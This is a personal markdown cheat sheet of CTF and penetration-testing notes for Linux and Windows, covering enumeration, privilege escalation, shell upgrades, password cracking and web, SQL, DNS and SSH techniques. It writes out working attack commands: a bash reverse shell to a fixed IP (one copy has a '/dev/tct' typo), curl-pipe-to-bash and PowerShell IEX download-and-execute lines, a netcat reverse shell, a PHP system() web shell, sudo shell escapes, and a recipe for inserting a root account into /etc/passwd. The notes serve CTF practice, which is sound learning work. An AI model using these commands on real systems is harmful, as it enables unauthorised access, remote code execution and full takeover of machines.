# CTF Notes

## Linux

Website for searching for shells through random programs such as 'vi' "living off the land binaries": [GTFObins](https://gtfobins.github.io/)

#### Enumeration

find files user has access to: 
```bash
find / -user <username> -ls 2>/dev/null
```
[Linux Privilege Checker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

full linux enumeration: 
- [LinEnum.sh](https://github.com/rebootuser/LinEnum) 
- [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

download * *and* * execute script (such as LinEnum.sh) [from remote host]: `curl <url or IP>/LinEnum.sh | bash`

Locate exploits: 
```bash
searchsploit <name_of_program> 
#to pull exploit code:
searchsploit -x <name/number of exploit> 
```

enumerate running processes: `pspy`

enumeration multi-tool: [Sparta](https://sparta.secforce.com/) (does nmap, hydra, nikto, sqlscan, ssl...)

Unix hardening tool that can be used for enumeration: [Bastille](http://bastille-linux.sourceforge.net/)

enumerate info about current processes running from: `/proc/self/status`

common Local File Inclusion locations: https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI

#### Upgrade shells:

```
1. sudo python -c 'import pty; pty.spawn("/bin/sh")'
2. sudo perl -e 'exec "/bin/sh";'
3. sudo ruby -e 'exec "/bin/sh"'
```

php shell: `<?php system($_GET['variable_name']); ?>`

bash reverse shell: 
```
bash -i >& /dev/tct/10.10.14.148/9001 0>&1
#URL encoded: 
bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
```
nc listener: `nc -lvnp <port>`

To upgrade to fully interactive shell:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'; 
ctrl-z #[to background]
stty raw -echo; 
fg #[to return shell to foreground]
export TERM=xterm 
```

#### TMUX

tmux can keep alive sessions if you lose ssh sessions etc, can split panes and more: 
```
tmux new -s <session_name> 
ctrl-b = prefix key (enables addnl commands) 
+[%] vertical pane  
+["] horizontal pane 
+[alt-space] switch pane between horizontal or vertical
+[arrow_keys] move between panes 
+[z] zoom in/out on pane 
+[?] help for tmux 
+[t] timer
```
tmux plugins:
- tmux logging plugin (get this!!) can save log of tmux windows
- [better mouse mode](https://github.com/NHDaly/tmux-better-mouse-mode)

#### Privilege Escalation

https://payatu.com/guide-linux-privilege-escalation

execute command as another user: `sudo -u <username> [command]`

execute any command while in less: `!<cmd>`

Privilege Escalation to Root with suid /bin/less: `chmod 47555 /bin/less`

Privilege Escalation to Root with find: `sudo find /etc -exec sh -i \;`

wildcard injection: [NEED MORE HERE]

```bash
mawk 'BEGIN {system("/bin/sh")}'
```
```
1. [user@localhost]$ sudo vi
2. :shell
3. [root@localhost]#

1. [user@localhost]$ sudo less file.txt
2. !bash
3. [root@localhost]#

1. [user@localhost]$ sudo more long_file.txt
2. !bash
3. [root@localhost]#
Note: for this method to work, the attacker has to read a file that is longer than one page
```

#### Misc Linux
Raw memory location so no files on disk: `/dev/shm/`

list all running commands:
```bash
ps -eo command`
#change delimiter to \n instead of <space> (loop by line): 
IFS=$'\n'
#Then loop through each line in output: 
for i in $(ps -eo command); do echo $i; done
```

'new' netstat: `ss -lnp | grep 9001` #check if any connections on port 9001

get user's superuser permissions: `sudo -l`

copy files to local machine without file transfer: 
```bash
base64 -w 0 /path/of/file/name.file 
#copy base64 then: 
echo -n <base64material> | base64 -d > filename.file
```
pretty print text in console? [Haven't looked this one up]: `jq`

web application fuzzer: [wfuzz](https://github.com/xmendez/wfuzz)

convert rpm to debian packages: `alien <file.rpm>`

Makes PWD part of path so dont need './' [NOT RECOMMENDED!]: `export PATH='pwd':$PATH`

cycle through previous arguments: `alt-.` 

move between "words" on a command line `ctrl-[arrow_keys] `

## Windows

living off the land binaries: [LOLBAS](https://lolbas-project.github.io/)

#### Enumeration
Windows Privilege Escalation Enumeration Script: [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Little bit o' everything: [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)

#### Unsorted
Powershell full path: `C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe`

Powershell "wget" and execute remote code: 
```powershell 
powershell "Invoke-Expression(New-Object Net.Webclient).downloadString('http://<ip>:<port>/<filename>')"
```
Powershell Script Execution Bypass: [can embed in php too!]: 
```powershell
echo IEX(New-Object Net.WebClient).DownloadString(http://<ip:port/filename.ps1>) | powershell -noprofile -
```
Powershell reverse shell and exploit scripts: nishang [Ippsec:HacktheBox - Optimum](https://www.youtube.com/watch?v=kWTnVBIpNsE)

Netcat reverse shell (after uploading the binary!): `nc64.exe -e cmd <ip port>`

tools: https://specterops.io/resources/research-and-development

easy windows shell: unicorn.py [trustedsec/unicorn](https://github.com/trustedsec/unicorn) [HackTheBox - Arctic](https://www.youtube.com/watch?v=e9lVyFH7-4o)

system information: `sysinfo`

Get user id: `getuid`

Powershell privilege escalation: 
- [PowerUp.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) from PowerShellEmpire
- Sherlock.ps1

[fuzzbunch](https://github.com/peterpt/fuzzbunch): exploit tool similar to metasploit

check what updates are installed: `type WindowsUpdate.log`

net use share from linux [like SimpleHTTPServer for Samba]: `impacket-smbserver <sharename> '<dir_to_share>'`

## Miscelaneous

#### Encryption/Decryption
[CyberChef](https://gchq.github.io/CyberChef/): Website for encryption/decryption of many different types at same time

good cipher tools: http://rumkin.com/ 

one time pad: `pt - ct = key`

decrypt rsa private key: `openssl rsautl -decrypt -inkey <key_file> < <pass.crypt (hex file?encrypted contents of pub key?)> `
- [Ippsec:HacktheBox - Charon](https://www.youtube.com/watch?v=_csbKuOlmdE)

crack password with known format:
```bash
hashcat -m <1600 (hashtype)> <hash.txt> --force -a 3 -1 <char_set> ?1?1?1?1?1?1?1?1 -O
[?1 = use 1 char from '1' set]
```
create wordlist with known character set & length: 
```bash
crunch <8 (min_length)> <8 (max_length)> <aefhrt (char_set)> > wordlist.txt
```
get hash formats for [hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes)

[Jumbo John](https://github.com/magnumripper/JohnTheRipper)

generate password for insertion into /etc/passwd: 
```bash
openssl passwd -l [or 1?] -salt <any_salt_value> <password> 
<username>:<generated_pass>:0:0:root:/root:/bin/bash #enter into /etc/passwd like this
```
[Hashes.org](https://hashes.org/): large database of pre-cracked hashes

Many password lists to download at [skullsecurity](https://wiki.skullsecurity.org/Passwords)

#### Binary Exploitation
gdb plugin for exploits/creates patterns for ROP determination: peda.py/pwndbg [gdb: pattern create ###]

ASLR Bypass/binary exploit/gdb: 
- [Ippsec:HackTheBox - October](https://www.youtube.com/watch?v=K05mJazHhF4)
- [Ippsec:Camp CTF - Bitterman](https://www.youtube.com/watch?v=6S4A2nhHdWg)
- [pwnTools](https://github.com/Gallopsled/pwntools) - [documentation](http://docs.pwntools.com/en/stable/)
- [Binary Ninja](https://binary.ninja/)

[Packetstorm](https://packetstormsecurity.com/) /bin/sh shellcode

simple binary exploitation [Ippsec:HacktheBox - Sneaky](https://www.youtube.com/watch?v=1UGxjqTnuyo)

[protostar ctf](https://exploit-exercises.com/protostar/) for getting into binary exploitation

#### HTTP
in order to proxy tools that have no proxy option: create burn proxy 127.0.0.1:80 [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)

vulnerability testing for webdav (or other file upload vulns!): `davtest`

bypassing filetype filters with http MOVE command to rename allowed filetype [Ippsec:HacktheBox - Granny & Grandpa](https://www.youtube.com/watch?v=ZfPVGJGkORQ)

Wordpress enumeration: `wpscan -u <url> [--disable-tls-checks]`
  
pull Google cached webpage if not loading: `cache:https://<somewebsite>`

virtual host routing: substitute ip for hostname to get different results

gobuster:
```bash
gobuster -u <url> -l -w <wordlist> -x php -t 20
[-l include length, -x append .php to searches, -t threads]
```
hydra against http wordpress login walkthrough: [IppSec:HacktheBox - Apocalyst](https://www.youtube.com/watch?v=TJVghYBByIA)

#### SQL
blind sql injection UNIoN queries: [Ippsec:HacktheBox - Charon](https://www.youtube.com/watch?v=_csbKuOlmdE) use `CONCAT("x","x")`

get shell in mysql: `\! /bin/sh`

[SQL Injection Cheatsheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

#### DNS
DNS reverse lookup recon: `dnsrecon -r <ip/subnet[127.0.0.0/24]> -n <ip_to_check>`

DNS zone transfer: `dig axfr <hostname> @<ip>`

add DNS server: `/etc/resolv.conf {nameserver <ip>}`

add Hosts: `/etc/hosts`

#### Steganography
extract files from stego'd files: `binwalk -Me <filename>`

#### SSH
generate ssh key for reomote access: 
```bash
ssh-keygen -f <filename>; cat <filename>;
#copy to remote host
echo <copied_key> > ./.ssh/authorized_keys #on remote host in /home/<user>/
chmod 600 <filename>; 
ssh -i <filename> <remotehost>
```
generate public key from private key: 
```bash
ssh-keygen -y -f ~/.ssh/id_rsa > ~/.ssh/id_rsa.pub

#As a side note, the comment of the public key is lost,so you need to edit ~/.ssh/id_rsa.pub 
#append a comment to the first line with a space between the comment and key data. An example public key is shown truncated below.

"ssh-rsa AAAA..../VqDjtS5 ubuntu@ubuntu"
```
If connection is dropped upon connect:
- Don't use bash for this session, try dash (or /bin/sh): `ssh 127.0.0.1 /bin/dash`
- Use bash with command options to disable processing startup files:
```bash
ssh 127.0.0.1 "bash --noprofile --norc"
```

#### Unsorted
shortcut for all ports: `nmap -p-`

Firefox Browser plugins:Tampermonkey (userscript manager); Cookie Manager+;

signing APK files: [IppSec:HHC2016 - Debug](https://www.youtube.com/watch?v=fcemTQaosOQ)

view hex of file only: `xxd -p`

reverse from hex: `xxd -r -p > <filename>`

vim:
- Learn vim: `vimtutor`
- https://www.youtube.com/watch?v=OnUiHLYZgaA
- vim plugins: fuzzy finder plugin ctrlp /// surround.vim

msfvenom custom exploit making:[Ippsec:HacktheBox - Granny & Grandpa] 
```bash
msfvenom -p <payload> LHOST=<lhost> etc... -f <filetype [use --help-formats first]>
```
injecting IPs when '.' is disallowed: convert dotted_decimal to decimal value -[ip2dh](https://github.com/4ndr34z/MyScripts/blob/master/ip2dh.py)

[AndroidAssetStudio](https://romannurik.github.io/AndroidAssetStudio/index.html)

port knocking: [Ippsec:HackTheBox - Nineveh](https://www.youtube.com/watch?v=K9DKULxSBK4)
- iptables knockd
```bash 
for i in <port> <port> <port>; do nmap -Pn -p $i --host_timeout 201 --max_retries 0 <ip>; done
```
recursively download all files in hosted folder: `wget -r <ip:port>`

[Hurricane Electric ISP](http://he.net/): Ippsec uses with IPv6 as a psuedo-VPN in [HTB:Sneaky](https://www.youtube.com/watch?v=1UGxjqTnuyo)

IPv6 primer [Ippsec:HacktheBox - Sneaky](https://www.youtube.com/watch?v=1UGxjqTnuyo)
```
fe80::/10 - febf:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Link Local 169.254.x.x APIPA 
(built from MAC address on Linux, 7th bit flips, adds ff:fe in the center)

fc00::/7 - fdff:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Local Unicast 10.x.x.x, 172.16.x.x, 192.168.x.x 

2000::/3 - Global Unicast routable 

ff02::1 - Multicast All Nodes 

ff02::2 Multicast ROUTER nodes
```
ip6tables - iptables for ipv6

## Write-ups

- https://medium.com/bugbountywriteup
- https://cowsayroot.com/
- https://www.nav1n.com/
- https://www.hackingarticles.in/
- https://resources.infosecinstitute.com/tools-of-trade-and-resources-to-prepare-in-a-hacker-ctf-competition-or-challenge/
- https://www.reddit.com/r/hackthebox/
- https://mzfr.github.io/vulnhub-writeups/

## CTF Tools & Cheatsheets

- https://github.com/Ganapati/RsaCtfTool <-- RSA cracking tools //uncipher data from weak public key and try to recover private key
- https://www.capturetheflags.com/tools-for-ctf/   <--Has both linux and windows
- https://github.com/apsdehal/aWEsoMe-cTf
- https://github.com/zardus/ctf-tools
- https://dvd848.github.io/CTFs/
- https://github.com/ryanking13/ctf-cheatsheet
- https://github.com/w181496/Web-CTF-Cheatsheet
- https://nikolaskama.me/infosec-cheat-sheets/
- https://www.peerlyst.com/posts/the-complete-list-of-infosec-related-cheat-sheets-claus-cramon
